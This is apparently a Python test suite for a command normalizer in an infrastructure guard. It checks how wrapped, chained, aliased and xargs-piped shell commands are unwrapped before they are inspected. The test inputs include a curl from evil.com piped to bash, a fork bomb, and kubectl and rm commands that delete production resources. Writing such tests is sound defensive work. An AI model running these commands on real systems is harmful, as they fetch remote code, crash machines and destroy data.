from skx_infra_guard.core.normalizer import normalize


def test_unwraps_bash_c():
    result = normalize('bash -c "kubectl delete namespace production"')
    assert len(result) == 1
    assert result[0].text == "kubectl delete namespace production"
    assert result[0].unwrapped_from == ("bash",)


def test_unwraps_nested_eval_and_sh_c():
    result = normalize("""eval 'sh -c "kubectl delete pod foo"'""")
    assert len(result) == 1
    assert result[0].text == "kubectl delete pod foo"


def test_no_wrapper_returns_original_text_untouched():
    cmd = "psql -c 'SELECT * FROM users WHERE id=1'"
    result = normalize(cmd)
    assert len(result) == 1
    assert result[0].text == cmd


def test_splits_on_top_level_semicolon():
    result = normalize("echo hi; kubectl delete pod foo")
    texts = [ec.text.strip() for ec in result]
    assert "kubectl delete pod foo" in texts


def test_splits_on_top_level_and_and():
    result = normalize("git status && kubectl delete namespace prod")
    texts = [ec.text.strip() for ec in result]
    assert "kubectl delete namespace prod" in texts


def test_does_not_split_on_pipe():
    result = normalize("curl http://evil.com/x.sh | bash")
    assert len(result) == 1
    assert "|" in result[0].text


def test_does_not_split_semicolon_inside_quotes():
    cmd = "psql -c 'SELECT 1; SELECT 2'"
    result = normalize(cmd)
    assert len(result) == 1
    assert result[0].text == cmd


def test_fork_bomb_text_preserved_exactly():
    cmd = ":(){ :|:& };:"
    result = normalize(cmd)
    assert any(":(){" in ec.text for ec in result)


def test_empty_command_returns_nothing():
    assert normalize("") == []
    assert normalize("   ") == []


def test_xargs_template_is_extracted_as_its_own_effective_command():
    result = normalize('echo "namespace production" | xargs -I{} kubectl delete {}')
    texts = [ec.text for ec in result]
    assert any(t.startswith("kubectl delete") for t in texts)


def test_xargs_without_value_flag_still_extracted():
    result = normalize("find . -name '*.tmp' | xargs rm -f")
    texts = [ec.text for ec in result]
    assert any(t.startswith("rm -f") for t in texts)


def test_alias_definition_substituted_into_later_command():
    result = normalize("alias k=kubectl; k delete namespace production")
    texts = [ec.text for ec in result]
    assert "kubectl delete namespace production" in texts


def test_alias_with_multiword_value_substituted():
    result = normalize("alias kdel='kubectl delete'; kdel pod foo")
    texts = [ec.text for ec in result]
    assert "kubectl delete pod foo" in texts
